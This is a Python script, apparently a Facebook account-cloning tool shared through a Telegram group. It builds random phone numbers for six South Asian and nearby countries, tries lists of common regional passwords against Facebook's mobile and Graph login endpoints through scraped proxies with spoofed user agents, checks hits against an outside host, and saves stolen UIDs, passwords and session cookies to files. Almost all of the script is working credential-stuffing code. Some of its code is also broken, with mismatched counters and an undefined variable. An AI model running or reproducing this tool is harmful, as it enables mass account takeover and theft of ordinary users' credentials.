# SCRIPT BY NAPA 
# JOIN GROUP : https://t.me/MR_napa_143
#---------------------[ IMPORT ]---------------------#
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
#---------------------[ LOOP ]---------------------#
id,user,napa,memek,loop,ok,cp=[],[],[],[],0,0,0
#---------------------[ PROXY ]---------------------#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('Proksi.txt','w').write(prox)
except Exception as e:
    print(e)
#---------------------[ COLOUR ]---------------------#
G="\033[1;32m";W="\x1b[1;97m";R="\x1b[38;5;160m";B="\033[1;90m";Y="\033[1;33m";T="\033[1;34m";E="\x1b[38;5;205m";O="\x1b[38;5;81m"
#---------------------[ STYLE ]---------------------#
xd = f" {R}[{G}×{R}]{G}";xd1=f" {R}[{G}1{R}]{G}";xd2=f" {R}[{G}2{R}]{G}";xd3=f" {R}[{G}3{R}]{G}";xd4=f" {R}[{G}4{R}]{G}";xd5=f" {R}[{G}5{R}]{G}";xd6=f" {R}[{G}6{R}]{G}";xd0=f" {R}[{G}0{R}]{G}";xdx=f" {R}[{G}?{R}]{G}"
#---------------------[ CLEAR ]---------------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{W}{47*'-'}")
#---------------------[ LOGO ]---------------------#
#_______________| color list 3 |_______________#
 
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'



logo = f'''
{G1}   _____                             
{G2}  / ____|                            
{G3} | (___  _   _ _ __ ___   ___  _ __  
{G4}  \___ \| | | | '_ ` _ \ / _ \| '_ \ 
{G5}  ____) | |_| | | | | | | (_) | | | |
 |_____/ \__,_|_| |_| |_|\___/|_| |_|
{W}{47*'-'}
{xd} DEVELOPER {R}:{G} SUMON
{xd} TOOLS     {R}:{G} RANDOM CLONE
{W}{47*'-'}'''
#---------------------[ MAIN MENU ]---------------------#
def NAPA():
    clear();print(f'{xd1} BANGLADESH RANDOM CLONING ');print(f'{xd2} INDIA RANDOM CLONING  ');print(f'{xd3} PAKISTAN RANDOM CLONING  ');print(f'{xd4} NEPAL RANDOM CLONING  ');print(f'{xd5} AFGHANISTAN RANDOM CLONING  ');print(f'{xd6} MALAYSIA RANDOM CLONING  ');print(f'{xd0} EXIT TOOLS ');linex();___option___ = input(f'{xdx} SELECTION {R}:{G} ')
    if ___option___ in ["1"]:os.system;napa.append('1');______randomxmenu_______()
    elif ___option___ in ["2"]:os.system;napa.append('2');______randomxmenu_______()
    elif ___option___ in ["3"]:os.system;napa.append('3');______randomxmenu_______()
    elif ___option___ in ["4"]:os.system;napa.append('4');______randomxmenu_______()
    elif ___option___ in ["5"]:os.system;napa.append('5');______randomxmenu_______()
    elif ___option___ in ["6"]:os.system;napa.append('6');______randomxmenu_______()
    elif ___option___ in ["0"]:exit()
    else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);NAPA()
#---------------------[ RANDOM BD/INDIA/PAKISTAN/NEPAL/AFGHANISTAN/MALAYSIA MENU ]---------------------#
def ______randomxmenu_______():
    clear()
    if "1" in napa:print(f"{xd} EXAMPLE {R}:{G} 013 {R}|{G} 016 {R}|{G} 017 {R}|{G} 018 {R}|{G} 019 ");linex()
    if "2" in napa:print(f"{xd} EXAMPLE {R}:{G} +91639 {R}|{G} +91600 {R}|{G} +91620 ");linex()
    if "3" in napa:print(f"{xd} EXAMPLE {R}:{G} 0306 {R}|{G} 0315 {R}|{G} 0335 {R}|{G} 0345 ");linex()
    if "4" in napa:print(f"{xd} EXAMPLE {R}:{G} 9814 {R}|{G} 9815 {R}|{G} 9861 {R}|{G} 9840 ");linex()
    if "5" in napa:print(f"{xd} EXAMPLE {R}:{G} +9340 {R}|{G} +9360 {R}|{G} +9330 {R}|{G} +9350 ");linex()
    if "6" in napa:print(f"{xd} EXAMPLE {R}:{G} 0113 {R}|{G} 0116 {R}|{G} 0112 {R}|{G} 0119 ");linex()
    code = input(f'{xdx} ENTER SIM CODE {R}:{G} ');linex();print(f"{xd} EXAMPLE {R}:{G} 6969 {R}|{G} 5555 {R}|{G} 7777 {R}|{G} 99999 ");linex();limit=int(input(f'{xdx} ENTER CRACK LIMIT {R}:{G} '))
    clear();print(f"{xd1} METHOD M1 {R}|{G}HOST{R}| ");print(f"{xd2} METHOD M2 {R}|{G}GRAPH{R}| ");linex();___method___=input(f'{xdx} ENTER METHOD {R}:{G} ')
    for nmbr in range(int(limit)):
        if "1" in napa:gang = ''.join(random.choice(string.digits) for _ in range(8));user.append(gang)
        if "2" in napa:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
        if "3" in napa:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
        if "4" in napa:gang = ''.join(random.choice(string.digits) for _ in range(6));user.append(gang)
        if "5" in napa:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
        if "6" in napa:gang = ''.join(random.choice(string.digits) for _ in range(7));user.append(gang)
    with ThreadPool(max_workers=50) as ____napa____:
        clear();tl = str(len(user))
        print(f'{xd} CODE{R}|{G}UID {R}:{W} {code}{R}|{W}{tl} ');print(f"{xd} IF NO RESULT ON{R}|{G}OFF AIRPLANE MODE");print(f'{xd} YOUR CLONING STARTED{W}.{R}.{W}.{R}.{W}.{R}.{W}.{R}.{W}.{R}!');linex()
        for love in user:
            ids = code + love 
            if "1" in napa:pasx=[ids,love,ids[:6],ids[:7],ids[:8],ids[5:],"1357911","Bangladesh","freefire2020","102030","304050","708090","901020","Freefire2022","123123","Bangladesh71","bangla1234","bangla@1234","freefire@1234","Sajib1234","nusrat1234"]
            if "2" in napa:pasx=[ids,love,ids[:6],"57273200","57575751","59039200"]
            if "3" in napa:pasx=[ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if "4" in napa:pasx=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if "5" in napa:pasx=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if "6" in napa:pasx=[ids,love,love[1:],ids[:7],ids[:6],ids[:8]]
            if ___method___ in ['1']:____napa____.submit(____methodA____,ids,pasx,tl)
            elif ___method___ in ['2']:____napa____.submit(____methodB____,ids,pasx,tl)
    print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{R}|{G}CP {R}:{G} '+str(len(ok))+f'{R}|{G}'+str(len(cp)));linex();exit()
#------------------[ USER AGENT ]------------------------#
def ____PO_CO____():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''



    def randua():
        ua1 = "[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/392505018;FBDM/{density=2.75,width=1080,height=2177};FBLC/en_US;FBRV/0;FBCR/Airtel;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
        ua2 = "[FBAN/FB4A;FBAV/380.0.0.29.109;FBBV/390885025;FBDM/{density=2.75,width=1080,height=2062};FBLC/en_US;FBRV/392634595;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 6 Pro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        ua3 = "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918983;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/342775358;FBCR/Airtel;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-J327VPP;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua4 = "[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919090;FBDM/{density=2.0,width=720,height=1448};FBLC/en_US;FBRV/385738515;FBCR/WIFI;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3195;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
        ua5 = "[FBAN/FB4A;FBAV/369.0.0.18.103;FBBV/373751961;FBDM/{density=3.0,width=1080,height=2032};FBLC/en_US;FBRV/374681835;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/LLD-L31;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)



def sex():
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 66666666))
    fbrv = str(random.randint(000000000,999999999))
    density = random.choice(['2.0'])
    width = random.choice(['1080'])
    height = random.choice(['2340'])
    ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 ;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
    return ua


def motorola():
    Anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    vir=str(random.choice(range(111111111,999999999)))
    cho=str(random.choice(range(43,447)))
    waid=str(random.choice(range(720,1500)))
    hight=str(random.choice(range(1500,2000)))
    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
    FBAN=fb.split("|")[1]
    platform=fb.split("|")[0]
    model=random.choice(["moto e5 plus","moto g(20)","moto e","NX55 Build","moto e(7i) power","moto e(7) plus","moto g go","moto g play - 2023","moto e6","moto g power (2021)","Moto"])
    ua="Dalvik/2.1.0 (Linux; U; Android "+Anderson+"; "+model+" Build/RTAS31.68-20-2) [FBAN/"+FBAN+";FBAV/"+cho+".0.0.13.142;FBPN/"+platform+";FBLC/es_US;FBBV/"+vir+";FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/"+model+";FBSV/11;FBCA/arm64-v8a:null;FBDM/{density="+str(random.choice(range(1,4)))+".75,width="+waid+",height="+hight+"};FB_FW/1;]"
    return ua


def uma():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993"])
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''
    
  



def __host__():
    version = random.choice([
        "14", "15", "10", "13", "7.0.0", "7.1.1", "9", "12", "11", 
        "9.0", "8.0.0", "7.1.2", "7.0", "4", "5", "4.4.2", "5.1.1", 
        "6.0.1", "9.0.1"
    ])
    
    model = random.choice([
        "Infinix X650", "Infinix X688C", "Infinix X682B", "Infinix X6811", "Infinix X6815", 
        "Infinix X670", "Infinix X689", "Infinix X683", "Infinix X657", "Infinix X663", 
        "Infinix X604", "Infinix X573", "Infinix X559C", "Infinix X6831", "Infinix X612" ])
    
    build = random.choice([
        'MMB29Q','R16NW','LRX22C','KTU84P','JLS36C','NJH47F',
        'PPR1.180610.011','QP1A.190711.020','NRD90M',
        'RP1A.200720.012','M1AJB','MMB29T'])
    
    ver = str(random.randint(77, 576))
    ver2 = str(random.randint(57, 76))
    
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''      
          
    
#---------------------[ RANDOM METHOD A ]---------------------#
def ____methodA____(ids,pasx,tl):
    global loop,ok,cp
    ewe = requests.Session()
    ua = f'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
    sys.stdout.write(f'\r\r{xd}-{R}[{G}SUMON-M1{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
    for pw in pasx:
        try:
            xx = open('Proksi.txt','r').read().splitlines()
            zz = {'http': 'socks4://'+random.choice(xx)}
            link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
            R2X = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/511.0.0.73.36;FBBV/461216351;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
            data = {
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": 0,
                "unrecognized_tries": 0,
                "email": ids,
                "prefill_contact_point": ids,
                "prefill_source": "browser_dropdown",
                "prefill_type": "contact_point",
                "first_prefill_source": "browser_dropdown",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": False,
                "is_smart_lock": False,
                "bi_xrwh": 0,
                "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
                }
            headers = {
                "Host": "touch.facebook.com",
                "content-length": str(len((data))),
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
                "sec-ch-ua-mobile": "?1",
                "user-agent": R2X,
                "x-response-format": "JSONStream",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "viewport-width": "360",
                "x-requested-with": "XMLHttpRequest",
                "x-asbd-id": "129477",
                "dpr": "2",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua-platform": '"Android"',
                "accept": "*/*",
                "origin": "https://touch.facebook.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }
            response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
                data = data,
                headers = headers,
                allow_redirects = False,
                proxies = zz
                )
            if "checkpoint" in ewe.cookies.get_dict():
                uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                print(f"\r{xd}-{R}[{Y}SUMON-CP{R}]{Y} {uid} | {pw} ")
                open('/sdcard/NAPA-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                cp+=1
                break
            elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                response = str(requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text)
                if 'LIVE' in response:
                    print(f"\r{xd}-{R}[{G}SUMON-OK{R}]{G} {uid} | {pw} ")
                    print(f"\r{R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                    open('/sdcard/SUMON-M1-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
                    ok+=1
                    break
                else:continue
        except requests.exceptions.ConnectionError:time.sleep(15)
    loop +=1
    



def RANDOM_API():
    facebook_version = f"{random.randint(10,450)}.{random.randint(0,0)}.{random.randint(0,9)}.{random.randint(1,40)}.{random.randint(10,450)}"
    fbbv = str(random.randint(00000000,99999999))
    mbvs = str(random.randint(000000,999999))
    fbrv = str(random.randint(000000000,999999999))
    density = random.choice(['2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    version = random.choice(['9', '10', '11', '12'])
    model = random.choice(['CPH1114','CPH1235','CPH1451','CPH1615','CPH1664','CPH1869','CPH1929','CPH1985','CPH2048','CPH2068','CPH2107','CPH2238','CPH2261','CPH2331','CPH2332','CPH2351','CPH2381','CPH2389','CPH2399','CPH2401','CPH2409','CPH2411','CPH2413','CPH2415','CPH2417','CPH2419','CPH2423','CPH2447','CPH2449','CPH2451','CPH2459','CPH2465','CPH2467','CPH2469','CPH2487','CPH2491','CPH2493','CPH2499','CPH2513','CPH2515','CPH2519','CPH2521','CPH2523','CPH2525','CPH2529','CPH2551','CPH2553','CPH2557','CPH2569','CPH2579','CPH2581','CPH2583','CPH2589','CPH2591','CPH2599','CPH2607','CPH2609','CPH2611','CPH2617','CPH2643','CPH3475','CPH3669','CPH3682','CPH3731','CPH3776','CPH3785','CPH4125','CPH4275','CPH4299','CPH4395','CPH4473','CPH4987','CPH5286','CPH5841','CPH5947','CPH6178','CPH6244','CPH6271','CPH6316','CPH6519','CPH6528','CPH6697','CPH7338','CPH7364','CPH7382','CPH7532','CPH7577','CPH7948','CPH7991','CPH8153','CPH8346','CPH8347','CPH8363','CPH8393','CPH8467','CPH8472','CPH8534','CPH8686','CPH8893','CPH9177','CPH9226','CPH9659','CPH9667','CPH9716','CPH9763','CPH9839','CPH9929','R830','R830S','R833T','R9','R9 Plus','R9km','R9s','R9s Plus','R9t','R9tm','Real','Reno','Reno 10','Reno 10 5G','Reno 10 Pro 5G','Reno 10 Pro+ 5G','Reno 10X','Reno 10X Zoom','Reno 2','Reno 2F','Reno 2Z','Reno 3','Reno 3 5G','Reno 3 Lite','Reno 3 Pro','Reno 3A','Reno 4 4G','Reno 4 5G','Reno 4 Lite','Reno 4 Pro 4G','Reno 4 Pro 5G','Reno 4 SE 5G','Reno 4F','Reno 4Z 5G','Reno 5','Reno 5 5G','Reno 5 Lite','Reno 5 Pro 5G','Reno 5 Pro Plus 5G','Reno 5A','Reno 5F','Reno 5G','Reno 5K','Reno 5K 5G','Reno 5Z','Reno 6','Reno 6 Pro','Reno 6 Pro 5G','Reno 6 Pro Plus','Reno 6 Z 5G','Reno 7','Reno 7 Pro','Reno 7 SE','Reno 7A','Reno 7Z','Reno 8','Reno 8 Pro','Reno 8 Pro+','Reno 8 Z','Reno 8T','Reno 9'])
    ua = f"[FBAN/MessengerLite;FBAV/{str(facebook_version)};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(fbrv)};FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBDV/{str(model)};FBSV/10;FBCA/arm64-v8a:null;FBDM/{{density={density},width={width},height={height}}};]"
    return ua
    
    
    
#---------------------[ RANDOM METHOD B ]---------------------#
def ____methodB____(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{xd}-{R}[{G}SUMON-M2{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
        try:
                for pw in pasx:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        Sajib = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{density=3.3,width=1080,height=1430};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
                        data = {"adid": adid,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pw,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={'User-Agent':Sajib,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '45204','X-FB-SIM-HNI': '45201','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '698'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        uid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        response = str(requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text)
                                        if 'LIVE' in response:
                                            print(f"\r{xd}-{R}[{G}SUMON-OK{R}]{G} {uid} | {pw} ")
                                            print(f"\r {R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                                            open('/sdcard/SUMON-M2-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
                                            ok.append(str(uid))
                                            break
                                        else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        print(f"\r{xd}-{R}[{Y}NAPA-CP{R}]{Y} {uid} | {pw} ")
                                        open('/sdcard/SUMON-M2-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                                        cp.append(str(uid))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#---------------------[ END CODE ]---------------------#
if __name__=='__main__':
    NAPA()